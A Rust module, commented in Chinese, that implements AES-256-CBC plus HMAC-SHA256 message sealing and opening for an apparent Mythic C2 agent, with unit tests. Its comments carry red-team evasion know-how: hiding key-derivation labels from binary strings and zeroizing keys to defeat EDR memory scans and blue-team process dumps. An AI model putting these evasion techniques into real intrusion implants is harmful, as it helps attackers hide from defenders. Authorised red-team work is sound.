// #![allow(unused)]

// 需要遵循mythic的通信协议:uuid(36B)+IV(16B)+Ciphertext+HMAC(32B)

// cbc负责数据保密(链式加密防止内容被窃听),sha-256负责提供底层hash运算,hmac结合密钥负责数据防伪和完整性(给密文和IV防伪,防止中途被篡改)

// 普通应用(微信/浏览器/web/app)开发时,几乎不会手写aes/cbc/hmac.普通应用信任底层传输通道(https的tls 1.2/1.3),浏览器发起请求时,底层TLS协议栈(如Windows的Schannel或浏览器的BoringSSL)会自动使用aes-gcm或其他方法加密封装流量,业务代码写的都是明文http,对加密过程无感
// 但c2框架中,必须做应用层二次加密.即在http报文体body内部,手动做一次aes-256-cbc-hmac.避免被中间人代理嗅探出原文.普通网络通信依赖/信任传输层TLS,c2通信把安全建立在应用层.无论外层走明文http/https/dns隧道,数据本身在离开agent内存前会被加密.
// Rust中如果需要调用某个对象的方法,这个方法又定义在某个Trait中.那么这个trait必须先用use引入当前作用域
// Cipher(密码):aes库将通用加密接口(trait)重新导出到这里
// block_padding填充子模块,Pkcs7填充算法结构体:Pkcs7是一个实现了BlockPadding trait的具体结构体.aes是一个块密码,每次固定处理16字节数据块.但实际发送的JSON数据长度是任意的,Pkcs7负责在末尾补齐缺失字节,解密后再自动把这部分剔除
// BlockModeDecrypt: 解密模式 trait,与 BlockModeEncrypt 对应,负责解密.
// KeyIvInit(key密钥+Iv初始向量+Init):定义了如何用key和IV初始化加密规则.
// BlockModeDecrypt, BlockModeEncrypt, KeyIvInit都是trait,只有Pkcs7是具体结构体
use aes::cipher::{BlockModeDecrypt, BlockModeEncrypt, KeyIvInit, block_padding::Pkcs7};
use base64::prelude::*;
// hmac库中的mac(message authentication code消息认证码) trait:包含现代密码学所有消息认证码的方法,如流式更新数据;封口取值;时间校验,都在后续代码中用到
// aes解决保密性,mac解决完整和真实性
use hmac::{KeyInit, Mac};
use rand::Rng;
// sha2是hash算法库,Sha256是一个具体的结构,内部实现了SHA-256算法的逻辑方法
use hkdf::Hkdf;
use sha2::Sha256;

// 以上,aes中Pkcs7对明文JSON对齐16字节(补齐/剔除多余字节);KeyIvInit规定通信建立时必须有32B key和16B IV;BlockModeEncrypt将明文转为密文
// sha256是纯粹hash运算,产生固定32字节hash值;hmac更新数据和检查真伪
// 明文 JSON 数据
//           ↓
//     [准备阶段] HKDF 用主密钥预先派生出两个独立子密钥: enc_key (加密) 和
//   mac_key (防伪)
//           ↓
//     1. rand::rng() -> 生成 16 字节真随机 IV
//           ↓
//     2. Pkcs7 + BlockModeEncrypt -> 原地自动补齐并加密成密文 (在 raw_buf
//   里两步合一，零内存分配)
//           ↓
//     3. mac.update() -> 将 16B IV 和密文一起喂入 HMAC-SHA256 引擎
//           ↓
//     4. mac.finalize() -> 封口输出 32 字节防伪标签 (Tag)
//           ↓
//     5. 组装物理帧 -> raw_buf 中严丝合缝形成: UUID(36B) + IV(16B) + Ciphertext +
//   Tag(32B)
//           ↓
//     6. Base64 编码 -> 整体转为可打印纯文本，出网发送给 Mythic 服务端

// type 类型别名(type alias)
// cbc模式不在乎具体加密算法(只要加密算法支持16字节分组就可以将加密算法嵌入),只负责xor异或和分组链式传递
// aes::Aes256,cbc底层用到的加密算法
type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;
type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;
// hmac通用的消息认证码结构(完整性签名),本身不绑定具体的hash函数,只要满足hash运算接口,无论md5/sha-1/sha-256/sha-512都可用
type HmacSha256 = hmac::Hmac<Sha256>;

// 原始二进制的uuid是16字节,但mythic c2设计通信协议时,为了方便数据库索引和调试,采用了标准带连字符的文本.即32个十六进制字符+4个短横线=36字节的ascii码.
// 协议位置:位于数据包最前面的36字节是明文uuid,让服务器端识别是哪个agent传来的数据
const UUID_LEN: usize = 36;
// aes-256密钥是32字节(256位),但其分组块大小依然是16字节.aes标准规定:无论密钥是128/192/256位,明文块和iv的长度永远是固定的16字节.因此,cbc模式初始化向量iv只能是16字节长度
const IV_LEN: usize = 16;
// sha-256计算出的hash值是256位(32字节).HMAC-SHA256生成的防伪校验码tag,其长度和底层hash输出完全一致.因此这里是32字节的用于校验真伪
const HMAC_LEN: usize = 32;
// 16+16+32=64;
// 单独的16代表PKCS#7规定填充规则.aes-cbc模式下,合法密文最小长度为16字节
// 密文载荷区最小长度.数据包被划分为“明文路由头”(uuid 36b)和“密文载荷区”两大部分
const MIN_ENCRYPTED_PAYLOAD_LEN: usize = IV_LEN + 16 + HMAC_LEN;

// 3. 缓冲区物理预算常量 (用于上层流式切片与内存规划)不是给加密函数自己分配内存用的，而是作为“规格说明书（Contract）”对外公布给调用者（Caller）用的
pub const MAX_RAW_LEN: usize = 3072; // 二进制包上限 (3072 * 4/3 = 4096)
pub const MAX_PLAINTEXT_LEN: usize = 2960; // 单切片最大明文容量 (扣除 100B 协议头尾与 PKCS7 补齐(uuid 36+iv16+hmac32)+pkcs7 16)
pub const MAX_B64_LEN: usize = 4096; // 对应的 Base64 编码缓冲区推荐大小

// 仅release下剔除debug特性
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
#[derive(PartialEq, Eq, Clone, Copy)]
// 默认情况下,Rust拥有枚举内存布局的自主排布权.此处使用 #[repr(u8)] 强制其判别值(Discriminant)严格占用1字节,使整个错误枚举实例仅占1字节,对内存极限压缩友好
#[repr(u8)]
pub enum CryptoError {
    // === 10~19: 上下文初始化阶段 (Context / Init) ===
    /// 主密钥长度不符合 32 字节要求 (触发于 CryptoContext::new)
    MasterKeyInvalidLength = 10,
    /// HKDF 派生 enc_key 失败
    HkdfExpandEncFailed = 11,
    /// HKDF 派生 mac_key 失败
    HkdfExpandMacFailed = 12,

    // === 20~29: 封包加密阶段 (Seal / Outgoing) ===
    /// 传入的 Agent UUID 长度不为 36 字节
    SealUuidInvalidLength = 20,
    /// 待发送明文超过 MAX_PLAINTEXT_LEN 上限
    SealPlaintextTooLong = 21,
    /// 调用者提供的 raw_buf 二进制暂存区容量不足
    SealRawBufTooSmall = 22,
    /// 初始化 CBC 加密器失败 (密钥/IV 异常)
    SealCipherInitFailed = 23,
    /// AES-CBC 原地填充加密失败
    SealEncryptionFailed = 24,
    /// 初始化 HMAC 签名器失败
    SealHmacInitFailed = 25,
    /// 调用者提供的 out_b64 输出缓冲区不足以容纳 Base64 文本
    SealB64OutBufTooSmall = 26,

    // === 30~39: 解包验真阶段 (Open / Incoming) ===
    /// 服务端返回的数据不是合法的 Base64 编码
    OpenBase64DecodeFailed = 30,
    /// Base64 解码后二进制长度小于协议最小物理帧
    OpenPayloadTooShort = 31,
    /// 初始化 HMAC 验真器失败
    OpenHmacInitFailed = 32,
    /// HMAC-SHA256 签名校验失败 (数据被篡改或密钥不匹配)
    OpenHmacMismatch = 33,
    /// 初始化 CBC 解密器失败
    OpenCipherInitFailed = 34,
    /// AES-CBC 解密填充剔除失败 (PKCS#7 损坏或密文损坏)
    OpenDecryptionFailed = 35,
}
// 因为有Clone和Copy,这里并不会转移所有权,导致原变量失效
impl CryptoError {
    #[inline(always)]
    pub const fn code(self) -> u8 {
        self as u8
    }
}

/// 硬件级内存擦除,阻止llvm作为dead code剔除:对于使用普通的byte.fill(0),此时llvm会认为填充为0后立即退出是没有意义的,会将其看为死码而消除,即不再执行将对应内存刷为0的操作.而write_volatile会让llvm不再做死代码消除,不能合并,不能延迟写入.而是无条件的去执行内存刷0操作.( 对应Windows 原生SecureZeroMemory函数操作)
#[inline(always)]
pub fn zeroize_slice(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        unsafe {
            core::ptr::write_volatile(byte, 0);
        }
    }
}

/// 会话级密码学上下文管理器
///
/// 在 Agent 启动建立会话时派生一次子密钥并长期复用，避免每次发包重复运行 6~8 次 HMAC-SHA256。
pub struct CryptoContext {
    enc_key: [u8; 32],
    mac_key: [u8; 32],
}

impl CryptoContext {
    /// 初始化并由主密钥派生子密钥
    pub fn new(master_key: &[u8]) -> Result<Self, CryptoError> {
        // AES-256 强制要求 256 位（256 ÷ 8 = 32 字节）的密钥
        if master_key.len() != 32 {
            return Err(CryptoError::MasterKeyInvalidLength);
        }

        // 内部通过 HMAC-SHA256 生成一个均匀分布的高熵伪随机密钥,保存在 hk 结构体中
        let hk = Hkdf::<Sha256>::new(None, master_key);
        let mut enc_key = [0u8; 32];
        let mut mac_key = [0u8; 32];

        // 用随机挑选的纯十六进制字节序列作为隔离标签,代替英文字符串,避免在.rdata中留下痕迹
        hk.expand(
            &[0x3A, 0xF9, 0x81, 0x5C, 0x22, 0xD4, 0x6E, 0x01],
            &mut enc_key,
        )
        .map_err(|_| CryptoError::HkdfExpandEncFailed)?;

        hk.expand(
            &[0x7B, 0xC4, 0x19, 0x2E, 0x88, 0xFA, 0x43, 0x02],
            &mut mac_key,
        )
        .map_err(|_| CryptoError::HkdfExpandMacFailed)?;

        Ok(Self { enc_key, mac_key })
    }

    /// 纯切片就地封包加密 (Caller-provided Buffer 模式)
    ///
    /// * `data`: 待发送明文切片 (不得超过 MAX_PLAINTEXT_LEN, 即 2960 字节)
    /// * `uuid`: 36 字节 Agent 唯一标识符
    /// * `raw_buf`: 调用者提供的二进制暂存缓冲区 (即提供的缓冲区容量不得小于所需二进制包总长，建议 >= MAX_RAW_LEN即3072)
    /// * `out_b64`: 调用者提供的 Base64 输出缓冲区 (用于网络发送，建议 >= MAX_B64_LEN即4096)
    /// * 返回: 写入 out_b64 的实际 Base64 字节长度
    pub fn seal_message(
        &self,
        data: &[u8],
        uuid: &str, // &str是16字节的胖指针,代表字符串切片(合法的utf-8).天然包含uuid的ascii编码格式
        raw_buf: &mut [u8], // 见注释1
        out_b64: &mut [u8],
    ) -> Result<usize, CryptoError> {
        if uuid.len() != UUID_LEN {
            return Err(CryptoError::SealUuidInvalidLength);
        }
        if data.len() > MAX_PLAINTEXT_LEN {
            return Err(CryptoError::SealPlaintextTooLong);
        }

        let padded_len = (data.len() / 16 + 1) * 16;
        let raw_total = UUID_LEN + IV_LEN + padded_len + HMAC_LEN;

        if raw_buf.len() < raw_total {
            return Err(CryptoError::SealRawBufTooSmall);
        }

        // 1. 生成 16 字节纯真随机 IV
        let mut iv = [0u8; IV_LEN];
        rand::rng().fill_bytes(&mut iv);

        // 2. 在调用者提供的 raw_buf 中就地布局明文数据.按 Mythic 协议排版数据
        let uuid_start = 0;
        let iv_start = UUID_LEN;
        let ct_start = iv_start + IV_LEN;
        let ct_end = ct_start + padded_len;
        let hmac_start = ct_end;

        // src: &[T] 传入的是一个不可变借用,没有索取所有权
        raw_buf[uuid_start..iv_start].copy_from_slice(uuid.as_bytes());
        raw_buf[iv_start..ct_start].copy_from_slice(&iv);
        raw_buf[ct_start..ct_start + data.len()].copy_from_slice(data);

        // 3. 不向os申请新内存,原地执行pkcs#7补齐并加密,在遇到任何异常失败时,立即销毁物理内存中明文
        // 初始化 CBC 加密状态机
        let encryptor = Aes256CbcEnc::new_from_slices(&self.enc_key, &iv)
            .map_err(|_| CryptoError::SealCipherInitFailed)?;

        // 原地填充和加密:
        if encryptor
            .encrypt_padded::<Pkcs7>(&mut raw_buf[ct_start..ct_end], data.len())
            .is_err()
        // 任何异常会直接清理明文json数据
        {
            zeroize_slice(raw_buf);
            zeroize_slice(&mut iv);
            return Err(CryptoError::SealEncryptionFailed);
        }

        // 4. 计算 HMAC-SHA256(IV + Ciphertext):为啥没有加上uuid 详见注释2
        // 实例化hmac签名器
        let mut mac =
            HmacSha256::new_from_slice(&self.mac_key).map_err(|_| CryptoError::SealHmacInitFailed)?;
        // [iv_start..ct_end]代表iv和ciphertext范围
        mac.update(&raw_buf[iv_start..ct_end]);
        // HMAC-SHA256最终产生固定32字节的tag
        let tag = mac.finalize().into_bytes();
        raw_buf[hmac_start..raw_total].copy_from_slice(&tag);

        // 5. 编码至调用者的 out_b64 输出缓冲区
        let b64_len = BASE64_STANDARD
            .encode_slice(&raw_buf[..raw_total], out_b64)
            .map_err(|_| {
                zeroize_slice(raw_buf);
                zeroize_slice(&mut iv);
                CryptoError::SealB64OutBufTooSmall
            })?;

        // 6. 物理擦除二进制暂存区与 IV 栈变量
        zeroize_slice(raw_buf);
        zeroize_slice(&mut iv);

        Ok(b64_len)
    }


    /// 纯切片单缓冲区原地解密 (In-place Decryption 模式):服务端发给客户端的指令数据,在客户端解密
    ///
    /// * `payload_b64`: 服务端返回给客户端的 Base64 字节切片
    /// * `raw_buf`: 调用者提供的单个工作缓冲区 (建议 >= MAX_RAW_LEN)。
    ///   解码、验真、解密均在此缓冲区内部就地完成，解密出的明文直接存放于 raw_buf[..plaintext_len]
    /// * 返回: 解密出的明文有效字节长度
    pub fn open_message(
        &self,
        payload_b64: &[u8],
        raw_buf: &mut [u8],
    ) -> Result<usize, CryptoError> {
        // 1. 就地 Base64 解码至 raw_buf
        let raw_len = BASE64_STANDARD
            .decode_slice(payload_b64, raw_buf)
            .map_err(|_| {
                zeroize_slice(raw_buf);
                CryptoError::OpenBase64DecodeFailed
            })?;

        // 2. 最小物理长度检验
        if raw_len < UUID_LEN + MIN_ENCRYPTED_PAYLOAD_LEN {
            zeroize_slice(&mut raw_buf[..raw_len]);
            return Err(CryptoError::OpenPayloadTooShort);
        }

        let iv_start = UUID_LEN;
        let ct_start = iv_start + IV_LEN;
        let hmac_start = raw_len - HMAC_LEN;

        // 3. 提取 IV
        let mut iv = [0u8; IV_LEN];
        iv.copy_from_slice(&raw_buf[iv_start..ct_start]);

        // 4. 恒定时间验证 HMAC-SHA256(IV + Ciphertext):先校验后解密,避免出现先解密后校验的漏洞

        // 使用派生的mac_key初始化hmac-sha256状态机
        let mut mac = HmacSha256::new_from_slice(&self.mac_key).map_err(|_| {
            zeroize_slice(&mut raw_buf[..raw_len]);
            zeroize_slice(&mut iv);
            CryptoError::OpenHmacInitFailed
        })?;
        // 把IV + 密文 Ciphertext放入hmac的状态机,此时还没有真正计算出tag.在verify_slice或finalize()时才真正计算
        mac.update(&raw_buf[iv_start..hmac_start]);

        // [hmac_start..raw_len] 代表服务端随包发来的签名 Tag；verify_slice 会在内部使用客户端的 mac 状态机计算并进行恒定时间比对
        if mac.verify_slice(&raw_buf[hmac_start..raw_len]).is_err() {
            zeroize_slice(&mut raw_buf[..raw_len]);
            zeroize_slice(&mut iv);
            return Err(CryptoError::OpenHmacMismatch);
        }

        // 5. AES-256-CBC 原地解密
        let decryptor = Aes256CbcDec::new_from_slices(&self.enc_key, &iv).map_err(|_| {
            zeroize_slice(&mut raw_buf[..raw_len]);
            zeroize_slice(&mut iv);
            CryptoError::OpenCipherInitFailed
        })?;

        let plaintext_len = match decryptor.decrypt_padded::<Pkcs7>(&mut raw_buf[ct_start..hmac_start]) {
            Ok(p) => p.len(),
            Err(_) => {
                zeroize_slice(&mut raw_buf[..raw_len]);
                zeroize_slice(&mut iv);
                return Err(CryptoError::OpenDecryptionFailed);
            }
        };

        // 6. 原地将明文搬移到缓冲区最前端，并洗白多余尾部内存
        raw_buf.copy_within(ct_start..ct_start + plaintext_len, 0);
        zeroize_slice(&mut raw_buf[plaintext_len..raw_len]);
        zeroize_slice(&mut iv);

        Ok(plaintext_len)
    }




}


// 离开作用域时自动物理清空会话密钥.为何如此麻烦,见注释3
impl Drop for CryptoContext {
    fn drop(&mut self) {
        zeroize_slice(&mut self.enc_key);
        zeroize_slice(&mut self.mac_key);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mythic_crypto_caller_buffer_roundtrip() {
        let master_key = b"01234567890123456789012345678901"; // 32 字节主密钥
        let uuid = "12345678-1234-1234-1234-1234567890ab"; // 36 字节 UUID
        let original_msg = br#"{"action":"checkin","os":"windows 11", "user":"SYSTEM"}"#;

        let ctx = CryptoContext::new(master_key).expect("Key init failed");

        // 调用者外包缓冲区
        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        // 1. 加密封包
        let b64_len = ctx
            .seal_message(original_msg, uuid, &mut raw_buf, &mut b64_buf)
            .expect("Seal failed");
        assert!(b64_len > 0);

        // 2. 解密封包 (复用 raw_buf，原地解密)
        let pt_len = ctx
            .open_message(&b64_buf[..b64_len], &mut raw_buf)
            .expect("Open failed");

        assert_eq!(&raw_buf[..pt_len], original_msg);
    }

    #[test]
    fn test_tampered_hmac_fails() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let original_msg = b"secret_task_data";

        let ctx = CryptoContext::new(master_key).unwrap();
        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        let b64_len = ctx
            .seal_message(original_msg, uuid, &mut raw_buf, &mut b64_buf)
            .unwrap();

        // 篡改 Base64 字节
        b64_buf[50] ^= 0xFF;

        let res = ctx.open_message(&b64_buf[..b64_len], &mut raw_buf);
        assert!(res.is_err());
    }

    #[test]
    fn test_granular_error_mapping() {
        let master_key = b"01234567890123456789012345678901";
        let ctx = CryptoContext::new(master_key).unwrap();

        // 1. 测试主密钥长度错误 (10)
        match CryptoContext::new(b"bad_key") {
            Err(e) => {
                assert_eq!(e, CryptoError::MasterKeyInvalidLength);
                assert_eq!(e.code(), 10);
            }
            Ok(_) => panic!("Expected error for bad key length"),
        }

        // 2. 测试 UUID 长度错误 (20)
        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];
        assert_eq!(
            ctx.seal_message(b"test", "short-uuid", &mut raw_buf, &mut b64_buf)
                .unwrap_err(),
            CryptoError::SealUuidInvalidLength
        );
        assert_eq!(CryptoError::SealUuidInvalidLength.code(), 20);

        // 3. 测试待发送明文超长 (21)
        let huge_data = [0u8; MAX_PLAINTEXT_LEN + 1];
        assert_eq!(
            ctx.seal_message(
                &huge_data,
                "12345678-1234-1234-1234-1234567890ab",
                &mut raw_buf,
                &mut b64_buf
            )
            .unwrap_err(),
            CryptoError::SealPlaintextTooLong
        );
        assert_eq!(CryptoError::SealPlaintextTooLong.code(), 21);

        // 4. 测试 Base64 解码失败 (30)
        assert_eq!(
            ctx.open_message(b"!!!not_valid_b64!!!", &mut raw_buf)
                .unwrap_err(),
            CryptoError::OpenBase64DecodeFailed
        );
        assert_eq!(CryptoError::OpenBase64DecodeFailed.code(), 30);

        // 5. 测试荷载长度过短 (31)
        let short_b64 = b"QUJD"; // "ABC" 解码后仅 3 字节
        assert_eq!(
            ctx.open_message(short_b64, &mut raw_buf).unwrap_err(),
            CryptoError::OpenPayloadTooShort
        );
        assert_eq!(CryptoError::OpenPayloadTooShort.code(), 31);
    }
}








// 注释1
// &mut [u8]:16字节胖指针,代表可变字节切片.这里表示纯二进制字节流,在这里缓冲区中,本函数将要传输的数据按照mythic协议要求拼装(uuid 36+iv 16+密文 16对齐+hmac 32);
// 且这里只是临时的,当数据被base64编码到out_b64后,需要调用zeroize_slice(raw_buf)擦除;
// 为何不用1个缓冲区存放raw_buf和out_b64:
// 因为后续调用了BASE64_STANDARD.encode_slice(&raw_buf[..raw_total], out_b64);而encode_slice 方法要求：输入切片（只读引用 &）和输出切片（可变引用&mut）绝对不能指向同一块重叠的内存.如果试图在同一个缓冲区里原地边读边转 Base64，由于 Base64编码后数据会变大（4/3倍），后面的编码结果会直接覆盖踩踏掉前面还没有读完的原始密文，引发数据损坏

// 注释2
// 1. 因为mythic协议规定不加uuid:c2通信是双向的,客户端必须和服务端的解密逻辑完全一致.mythic协议在设计之初,就只对iv+ciphertext计算hmac
// 2. mythic之所以不加uuid:因为服务端接收到http post时,并不知道这个包具体是哪个agent发的,服务端必须先截取出uuid执行sql查询后才能和agent对上.服务端才有资格去初始化.
// 3. 没有hmac uuid,如果uuid被篡改,服务端查不到会直接断开连接.即使算到了另一个真实存在的agent的uuid,也会因为hmac tag不符被发现.

// 注释3
// 在整个代码里不厌其烦地执行“内存刷零（Zeroize）”，而且在 Drop特征里再次强调它，是因为触及到了操作系统底层机制、逆向内存取证以及现代 EDR对抗中最核心的命门：内存残留（Memory Remanence / Stale Data）
// 在操作系统和编译器中,内存从不主动清空.当变量离开作用域/调用类似c的free(ptr)/函数返回,栈帧销毁(rsp上移),os根本不会真正的把对应的物理内存清零.
//  栈内存销毁,只是cpu的rsp移动;堆内存销毁,只是os的堆管理器(如 RtlFreeHeap)在链表上标记这块内存可以再次分配.因此,那 32 字节的 enc_key、mac_key 以及刚才解密出来的明文JSON会一直存在几秒、几分钟，直到后续有别的函数刚好分配到这个地址并覆盖它.红队对抗中,这带来的灾难:
// 1. 当进程调用敏感 API、或者定期心跳、或者线程进入挂起时，EDR会对当前进程的所有可读写内存页（PAGE_READWRITE）进行静默扫描
// 2. AES 密钥特征定位：AES 算法具有非常明显的轮密钥扩展（Key Schedule）数学结构。分析工具（如FindCrypt、YARA）可以直接在充满垃圾的内存碎片中，通过熵值和数学特征把残留的AES 密钥精准找出来.如果密钥一直在内存里裸奔，EDR 扫描一次就能把你的通信凭据提取一空
// 蓝队内存转储（Process Minidump / Dump Analysis）:蓝队发现某台主机网络流量异常时,会使用 Sysinternals 的 procdump.exe，或者任务管理器，或者调用 Windows API MiniDumpWriteDump，把整个可疑进程的内存一键完整 Dump 下来生成 .dmp 文件.将 .dmp 丢进 Volatility 或者 WinDbg中，运行字符串搜索或内存分析脚本.如果你没有刷零，蓝队不仅能直接搜出服务端的IP、UUID，还能直接从转储中把解密密钥提取出来.进而拿这个密钥去解密 Wireshark / 交换机抓到的全部历史网络包，整个 C2通道彻底被“穿透”
// 补充与睡眠混淆（hypnus）功能:在进入 Sleep 前，hypnus 会加密当前的栈和敏感段.但是，如果某些旧会话结构体已经被 Drop销毁了，但密钥依然残留在已释放的野内存中，hypnus是管不到这些不在保护名单上的碎片内存的